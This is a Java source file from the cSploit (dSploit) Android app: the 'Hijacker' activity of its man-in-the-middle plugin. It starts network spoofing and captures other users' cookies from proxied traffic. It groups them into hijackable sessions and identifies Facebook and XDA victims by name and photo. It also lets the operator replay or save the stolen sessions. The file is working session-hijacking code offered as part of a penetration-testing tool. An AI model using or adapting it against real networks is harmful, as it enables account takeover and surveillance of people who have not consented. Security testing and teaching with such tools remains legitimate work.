/*
 * This file is part of the dSploit.
 *
 * Copyleft of Simone Margaritelli aka evilsocket <evilsocket@gmail.com>
 *
 * dSploit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * dSploit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with dSploit.  If not, see <http://www.gnu.org/licenses/>.
 */
package org.csploit.android.plugins.mitm.hijacker;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Canvas;
import android.os.AsyncTask;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.MenuInflater;
import android.view.MenuItem;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.ViewGroup;
import android.widget.AdapterView;
import android.widget.AdapterView.OnItemClickListener;
import android.widget.AdapterView.OnItemLongClickListener;
import android.widget.ArrayAdapter;
import android.widget.ImageView;
import android.widget.ListView;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;
import android.widget.ToggleButton;

import org.csploit.android.R;
import org.csploit.android.core.ChildManager;
import org.csploit.android.core.Logger;
import org.csploit.android.core.System;
import org.csploit.android.gui.dialogs.ConfirmDialog;
import org.csploit.android.gui.dialogs.ConfirmDialog.ConfirmDialogListener;
import org.csploit.android.gui.dialogs.ErrorDialog;
import org.csploit.android.gui.dialogs.InputDialog;
import org.csploit.android.gui.dialogs.InputDialog.InputDialogListener;
import org.csploit.android.gui.dialogs.SpinnerDialog;
import org.csploit.android.gui.dialogs.SpinnerDialog.SpinnerDialogListener;
import org.csploit.android.net.http.RequestParser;
import org.csploit.android.net.http.proxy.Proxy.OnRequestListener;
import org.csploit.android.plugins.mitm.SpoofSession;
import org.csploit.android.plugins.mitm.SpoofSession.OnSessionReadyListener;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpCookie;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.HashMap;

public class Hijacker extends AppCompatActivity {
	private ToggleButton mHijackToggleButton = null;
	private ProgressBar mHijackProgress = null;
	private SessionListAdapter mAdapter = null;
	private boolean mRunning = false;
	private RequestListener mRequestListener = null;
	private SpoofSession mSpoof = null;

	private static int getFaviconFromDomain(String domain) {
		if (domain.contains("amazon."))
			return R.drawable.favicon_amazon;

		else if (domain.contains("google."))
			return R.drawable.favicon_google;

		else if (domain.contains("youtube."))
			return R.drawable.favicon_youtube;

		else if (domain.contains("blogger."))
			return R.drawable.favicon_blogger;

		else if (domain.contains("tumblr."))
			return R.drawable.favicon_tumblr;

		else if (domain.contains("facebook."))
			return R.drawable.favicon_facebook;

		else if (domain.contains("twitter."))
			return R.drawable.favicon_twitter;

		else if (domain.contains("xda-developers."))
			return R.drawable.favicon_xda;

		else
			return R.drawable.favicon_generic;
	}

	public class SessionListAdapter extends ArrayAdapter<Session> {
		private int mLayoutId = 0;
		private HashMap<String, Session> mSessions = null;

		public class FacebookUserTask extends AsyncTask<Session, Void, Boolean> {
			private Bitmap getUserImage(String uri) {
				Bitmap image = null;
				try {
					URL url = new URL(uri);
					URLConnection conn = url.openConnection();
					conn.connect();

					InputStream input = conn.getInputStream();
					BufferedInputStream reader = new BufferedInputStream(input);

					image = Bitmap.createScaledBitmap(
							BitmapFactory.decodeStream(reader), 48, 48, false);

					reader.close();
					input.close();
				} catch (IOException e) {
					System.errorLogging(e);
				}

				return image;
			}

			private String getUserName(String uri) {
				String username = null;

				try {
					URL url = new URL(uri);
					URLConnection conn = url.openConnection();
					conn.connect();

					InputStream input = conn.getInputStream();
					BufferedReader reader = new BufferedReader(
							new InputStreamReader(input));
					String line;
					final StringBuilder dataBuilder = new StringBuilder();
					while ((line = reader.readLine()) != null)
						dataBuilder.append(line);

					reader.close();
					input.close();

					JSONObject response = new JSONObject(dataBuilder.toString());

					username = response.getString("name");
				} catch (Exception e) {
					System.errorLogging(e);
				}

				return username;
			}

			@Override
			protected Boolean doInBackground(Session... sessions) {
				Session session = sessions[0];
				HttpCookie user = session.mCookies.get("c_user");

				if (user != null) {
					String fbUserId = user.getValue(), fbGraphUrl = "https://graph.facebook.com/"
							+ fbUserId + "/", fbPictureUrl = fbGraphUrl
							+ "picture";

					session.mUserName = getUserName(fbGraphUrl);
					session.mPicture = getUserImage(fbPictureUrl);
				}

				return true;
			}

			@Override
			protected void onPostExecute(Boolean result) {
				mAdapter.notifyDataSetChanged();
			}
		}

		public class XdaUserTask extends AsyncTask<Session, Void, Boolean> {
			private Bitmap getUserImage(String uri) {
				Bitmap image = null;
				try {
					URL url = new URL(uri);
					URLConnection conn = url.openConnection();
					conn.connect();

					InputStream input = conn.getInputStream();
					BufferedInputStream reader = new BufferedInputStream(input);

					image = Bitmap.createScaledBitmap(
							BitmapFactory.decodeStream(reader), 48, 48, false);

					reader.close();
					input.close();
				} catch (IOException e) {
					System.errorLogging(e);
				}

				return image;
			}

			@Override
			protected Boolean doInBackground(Session... sessions) {
				Session session = sessions[0];
				HttpCookie userid = session.mCookies.get("bbuserid"), username = session.mCookies
						.get("xda_wikiUserName");

				if (userid != null)
					session.mPicture = getUserImage("http://media.xda-developers.com/customavatars/avatar"
							+ userid.getValue() + "_1.gif");

				if (username != null)
					session.mUserName = username.getValue().toLowerCase();

				return true;
			}

			@Override
			protected void onPostExecute(Boolean result) {
				mAdapter.notifyDataSetChanged();
			}
		}

		public class SessionHolder {
			ImageView favicon;
			TextView address;
			TextView domain;
		}

		public SessionListAdapter(int layoutId) {
			super(Hijacker.this, layoutId);

			mLayoutId = layoutId;
			mSessions = new HashMap<String, Session>();
		}

		public Session getSession(String address, String domain, boolean https) {
			return mSessions.get(address + ":" + domain + ":" + https);
		}

		public synchronized void addSession(Session session) {
			mSessions.put(session.mAddress + ":" + session.mDomain + ":"
					+ session.mHTTPS, session);
		}

		public synchronized Session getByPosition(int position) {
			return mSessions.get(mSessions.keySet().toArray()[position]);
		}

		@Override
		public int getCount() {
			return mSessions.size();
		}

		public Bitmap addLogo(Bitmap mainImage, Bitmap logoImage) {
			Bitmap finalImage;
			int width, height;

			width = mainImage.getWidth();
			height = mainImage.getHeight();

			finalImage = Bitmap.createBitmap(width, height,
					mainImage.getConfig());

			Canvas canvas = new Canvas(finalImage);

			canvas.drawBitmap(mainImage, 0, 0, null);
			canvas.drawBitmap(logoImage,
					canvas.getWidth() - logoImage.getWidth(),
					canvas.getHeight() - logoImage.getHeight(), null);

			return finalImage;
		}

		@Override
		public View getView(int position, View convertView, ViewGroup parent) {
			View row = convertView;
			SessionHolder holder;
			Session session = getByPosition(position);

			if (row == null) {
				LayoutInflater inflater = (LayoutInflater) Hijacker.this
						.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
				row = inflater.inflate(mLayoutId, parent, false);

				holder = new SessionHolder();

				holder.favicon = (ImageView) (row != null ? row
						.findViewById(R.id.sessionIcon) : null);
				holder.address = (TextView) (row != null ? row
						.findViewById(R.id.sessionTitle) : null);
				holder.domain = (TextView) (row != null ? row
						.findViewById(R.id.sessionDescription) : null);

				if (row != null)
					row.setTag(holder);

			} else
				holder = (SessionHolder) row.getTag();

			if (!session.mInited) {
				session.mInited = true;

				if (session.mDomain.contains("facebook.")
						&& session.mCookies.get("c_user") != null)
					new FacebookUserTask().execute(session);

				else if (session.mDomain.contains("xda-developers.")
						&& session.mCookies.get("bbuserid") != null)
					new XdaUserTask().execute(session);
			}

			Bitmap picture;

			if (session.mPicture != null)
				picture = session.mPicture;
			else
				picture = BitmapFactory.decodeResource(getResources(),
						getFaviconFromDomain(session.mDomain));

			if (session.mHTTPS)
				picture = addLogo(picture, BitmapFactory.decodeResource(
						getResources(), R.drawable.https_session));

			if (holder.favicon != null)
				holder.favicon.setImageBitmap(picture);

			if (session.mUserName != null) {
				if (holder.address != null)
					holder.address.setText(session.mUserName);
      } else if (holder.address != null)
					holder.address.setText(session.mAddress);

			if (holder.domain != null)
				holder.domain.setText(session.mDomain);

			return row;
		}
	}

	class RequestListener implements OnRequestListener {
		@Override
		public void onRequest(boolean https, String address, String hostname,
				ArrayList<String> headers) {
			ArrayList<HttpCookie> cookies = RequestParser
					.getCookiesFromHeaders(headers);

			// got any cookie ?
			if (cookies != null && cookies.size() > 0) {
				String domain = cookies.get(0).getDomain();

				if (domain == null || domain.isEmpty()) {
					domain = RequestParser.getBaseDomain(hostname);

					for (HttpCookie cooky : cookies)
						cooky.setDomain(domain);
				}

				Session session = mAdapter.getSession(address, domain, https);

				// new session ^^
				if (session == null) {
					session = new Session();
					session.mHTTPS = https;
					session.mAddress = address;
					session.mDomain = domain;
					session.mUserAgent = RequestParser.getHeaderValue(
							"User-Agent", headers);
				}

				// update/initialize session cookies
				for (HttpCookie cookie : cookies) {
					session.mCookies.put(cookie.getName(), cookie);
				}

				final Session fsession = session;
				Hijacker.this.runOnUiThread(new Runnable() {
					@Override
					public void run() {
						mAdapter.addSession(fsession);
						mAdapter.notifyDataSetChanged();
					}
				});
			}
		}
	}

	public void onCreate(Bundle savedInstanceState) {
		SharedPreferences themePrefs = getSharedPreferences("THEME", 0);
		Boolean isDark = themePrefs.getBoolean("isDark", false);
		if (isDark)
			setTheme(R.style.DarkTheme);
		else
			setTheme(R.style.AppTheme);
		super.onCreate(savedInstanceState);
		setTitle(System.getCurrentTarget() + " > MITM > "
				+ getString(R.string.session_sniffer));
		setContentView(R.layout.plugin_mitm_hijacker);
		getSupportActionBar().setDisplayHomeAsUpEnabled(true);

		mHijackToggleButton = (ToggleButton) findViewById(R.id.hijackToggleButton);
		mHijackProgress = (ProgressBar) findViewById(R.id.hijackActivity);
		ListView mListView = (ListView) findViewById(R.id.listView);
		mAdapter = new SessionListAdapter(
				R.layout.plugin_mitm_hijacker_list_item);
		mSpoof = new SpoofSession();

		mListView.setAdapter(mAdapter);
		mListView.setOnItemClickListener(new OnItemClickListener() {
			@Override
			public void onItemClick(AdapterView<?> parent, View view,
					int position, long id) {
				final Session session = mAdapter.getByPosition(position);
				if (session != null) {
					new ConfirmDialog(getString(R.string.hijack_session),
							mRunning ? getString(R.string.start_hijacking)
									: getString(R.string.start_hijacking2),
							Hijacker.this, new ConfirmDialogListener() {
								@Override
								public void onConfirm() {
									if (mRunning)
										setStoppedState();

									System.setCustomData(session);

									startActivity(new Intent(Hijacker.this,
											HijackerWebView.class));
								}

								@Override
								public void onCancel() {
								}
							}).show();
				}
			}
		});

		mListView.setOnItemLongClickListener(new OnItemLongClickListener() {
			@Override
			public boolean onItemLongClick(AdapterView<?> parent, View view,
					int position, long id) {
				final Session session = mAdapter.getByPosition(position);
				if (session != null) {
					new InputDialog(getString(R.string.save_session),
							getString(R.string.set_session_filename), session
									.getFileName(), true, false, Hijacker.this,
							new InputDialogListener() {
								@Override
								public void onInputEntered(String name) {
									if (!name.isEmpty()) {

										try {
											String filename = session
													.save(name);

											Toast.makeText(
													Hijacker.this,
													getString(R.string.session_saved_to)
															+ filename + " .",
													Toast.LENGTH_SHORT).show();
										} catch (IOException e) {
											new ErrorDialog(
													getString(R.string.error),
													e.toString(), Hijacker.this)
													.show();
										}
									} else
										new ErrorDialog(
												getString(R.string.error),
												getString(R.string.invalid_session),
												Hijacker.this).show();
								}
							}).show();
				}

				return true;
			}
		});

		mHijackToggleButton.setOnClickListener(new OnClickListener() {
			@Override
			public void onClick(View v) {
				if (mRunning) {
					setStoppedState();
				} else {
					setStartedState();
				}
			}
		});

		mRequestListener = new RequestListener();
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		MenuInflater inflater = getMenuInflater();
		inflater.inflate(R.menu.hijacker, menu);
		return super.onCreateOptionsMenu(menu);
	}

	private void setStartedState() {

		if (System.getProxy() != null)
			System.getProxy().setOnRequestListener(mRequestListener);

    try {
      mSpoof.start(new OnSessionReadyListener() {
        @Override
        public void onSessionReady() {
          Hijacker.this.runOnUiThread(new Runnable() {
            @Override
            public void run() {
              mHijackToggleButton.setText(R.string.stop);
              mHijackProgress.setVisibility(View.VISIBLE);
              mRunning = true;
            }
          });
        }

        @Override
        public void onError(String error, int resId) {
          error = error == null ? getString(resId) : error;
          setSpoofErrorState(error);
        }
      });
    } catch (ChildManager.ChildNotStartedException e) {
      Logger.error(e.getMessage());
      Toast.makeText(Hijacker.this, getString(R.string.child_not_started), Toast.LENGTH_LONG).show();
    }
  }

	private void setSpoofErrorState(final String error) {
		Hijacker.this.runOnUiThread(new Runnable() {
			@Override
			public void run() {
				if (!Hijacker.this.isFinishing()) {
					new ErrorDialog(getString(R.string.error), error,
							Hijacker.this).show();
					setStoppedState();
				}
			}
		});
	}

	private void setStoppedState() {
		mSpoof.stop();

		if (System.getProxy() != null)
			System.getProxy().setOnRequestListener(null);

		mHijackProgress.setVisibility(View.INVISIBLE);

		mRunning = false;
		mHijackToggleButton.setChecked(false);
	}

	@Override
	public boolean onOptionsItemSelected(MenuItem item) {
		int itemId = item.getItemId();

		switch (itemId) {
		case android.R.id.home:

			onBackPressed();

			return true;

		case R.id.load:

			final ArrayList<String> sessions = System
					.getAvailableHijackerSessionFiles();

			if (sessions != null && sessions.size() > 0) {
				new SpinnerDialog(getString(R.string.select_session),
						getString(R.string.select_session_file),
						sessions.toArray(new String[sessions.size()]),
						Hijacker.this, new SpinnerDialogListener() {
							@Override
							public void onItemSelected(int index) {
								String filename = sessions.get(index);

								try {
									Session session = Session.load(filename);

									if (session != null) {
										mAdapter.addSession(session);
										mAdapter.notifyDataSetChanged();
									}
								} catch (Exception e) {
									e.printStackTrace();
									new ErrorDialog("Error", e.getMessage(),
											Hijacker.this).show();
								}
							}
						}).show();
			} else
				new ErrorDialog(getString(R.string.error),
						getString(R.string.no_session_found), Hijacker.this)
						.show();

			return true;

		default:
			return super.onOptionsItemSelected(item);
		}
	}

	@Override
	public void onBackPressed() {
		setStoppedState();
		super.onBackPressed();
		overridePendingTransition(R.anim.fadeout, R.anim.fadein);
	}
}
